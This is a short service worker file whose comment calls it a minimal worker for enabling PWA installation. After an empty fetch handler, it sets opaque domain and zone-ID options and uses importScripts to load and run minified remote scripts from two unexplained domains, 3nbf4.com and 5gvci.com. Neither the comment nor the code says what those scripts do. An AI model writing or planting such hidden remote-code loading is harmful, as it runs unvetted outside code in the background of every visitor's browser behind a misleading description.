// Minimal Service Worker to enable PWA Installation
self.addEventListener('fetch', (event) => {
  // This can be empty, but it must exist
});

self.options = {
    "domain": "3nbf4.com",
    "zoneId": 11185221
}
self.lary = ""
importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')

self.options = {
    "domain": "5gvci.com",
    "zoneId": 11185228
}
self.lary = ""
importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
